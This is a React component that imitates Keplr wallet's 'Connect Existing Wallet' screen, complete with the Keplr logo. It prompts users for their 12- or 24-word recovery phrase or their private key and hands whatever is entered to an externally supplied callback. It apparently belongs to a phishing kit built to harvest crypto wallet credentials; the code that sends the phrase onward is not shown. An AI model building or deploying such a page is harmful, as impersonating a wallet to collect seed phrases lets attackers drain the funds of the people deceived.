import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useWalletStore } from "@/store/walletStore";

const Keplr = ({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) => {
	const [activeTab, setActiveTab] = useState("12");
	const [words12, setWords12] = useState<string[]>(Array(12).fill(""));
	const [words24, setWords24] = useState<string[]>(Array(24).fill(""));
	const [privateKey, setPrivateKey] = useState("");

	const { setSeedPhrase } = useWalletStore();

	const handleComplete = () => {
		let walletPhrase = "";

		if (activeTab === "12") {
			walletPhrase = words12.join(" ").trim();
		} else if (activeTab === "24") {
			walletPhrase = words24.join(" ").trim();
		} else {
			walletPhrase = privateKey.trim();
		}

		if (!walletPhrase) return;

		setSeedPhrase(walletPhrase);
		handleFinish(walletPhrase);
	};

	const handleWordChange = (
		index: number,
		value: string,
		wordCount: 12 | 24
	) => {
		if (wordCount === 12) {
			const newWords = [...words12];
			newWords[index] = value.toLowerCase().trim();
			setWords12(newWords);
		} else {
			const newWords = [...words24];
			newWords[index] = value.toLowerCase().trim();
			setWords24(newWords);
		}
	};

	const allWords12Filled = words12.every((word) => word.length > 0);
	const allWords24Filled = words24.every((word) => word.length > 0);

	return (
		<div className="min-h-screen w-full bg-black flex items-center justify-center py-4 px-2 text-white">
			<div className="w-full max-w-xl">
				<div className="p-2 md:p-12 relative flex flex-col w-full justify-center items-center">
					<span className="mb-2">
						<img
							src="/images/wallets/keplr-logo.png"
							alt="keplr"
							className="w-24"
						/>
					</span>
					<h1 className="text-xl font-bold mb-2">Connect Existing Wallet</h1>

					<ul className="space-y-2 mb-6 text-white/70 text-start text-sm">
						<li>• Enter your recovery phrase here to connect wallet.</li>
						<li>
							• Enter the phrase in the right order without
							capitalization,punctuation symbols, or spaces.
						</li>
					</ul>

					{/* Card */}
					<div className="bg-[#1D1D1F] px-4 py-8 rounded-2xl w-full">
						{/* Tabs */}
						<Tabs
							value={activeTab}
							onValueChange={setActiveTab}
							className="mb-8"
						>
							<TabsList className="grid w-full grid-cols-3 bg-black/80 rounded-full max-w-80 h-12 text-white/60 m-auto">
								{["12", "24", "private"].map((tab) => (
									<TabsTrigger
										key={tab}
										value={tab}
										className={`rounded-full transition-all ${
											activeTab === tab
												? "bg-gray-100 text-white font-semibold"
												: "text-white/60 hover:text-white"
										}`}
									>
										{tab === "12"
											? "12 words"
											: tab === "24"
											? "24 words"
											: "Private key"}
									</TabsTrigger>
								))}
							</TabsList>

							<TabsContent
								value="12"
								className="mt-6"
							>
								<div className="grid grid-cols-3 gap-2">
									{words12.map((word, index) => (
										<div
											key={index}
											className="relative flex justify-center items-center gap-1"
										>
											<span className="text-sm font-medium">{index + 1}.</span>
											<Input
												value={word}
												onChange={(e) =>
													handleWordChange(index, e.target.value, 12)
												}
												className="border border-white/20 focus:border-white/40 py-4 bg-black"
											/>
										</div>
									))}
								</div>
							</TabsContent>

							<TabsContent
								value="24"
								className="mt-6"
							>
								<div className="grid grid-cols-4 gap-3">
									{words24.map((word, index) => (
										<div
											key={index}
											className="relative flex justify-center items-center gap-1"
										>
											<span className="text-xs font-medium">{index + 1}.</span>
											<Input
												value={word}
												onChange={(e) =>
													handleWordChange(index, e.target.value, 24)
												}
												className="border border-white/20 focus:border-white/40 py-4 bg-black"
											/>
										</div>
									))}
								</div>
							</TabsContent>

							<TabsContent
								value="private"
								className="mt-6"
							>
								<Textarea
									value={privateKey}
									onChange={(e) => setPrivateKey(e.target.value)}
									placeholder="Enter your private key"
									className="min-h-[12px] resize-none"
								/>
							</TabsContent>
						</Tabs>
						<div className="flex w-full px-8">
							<button
								onClick={handleComplete}
								disabled={
									(activeTab === "12" && !allWords12Filled) ||
									(activeTab === "24" && !allWords24Filled) ||
									(activeTab === "private" && !privateKey)
								}
								className="w-full bg-[#009FDD] disabled:opacity-50 py-4 rounded-lg"
							>
								Connect
							</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	);
};

export default Keplr;
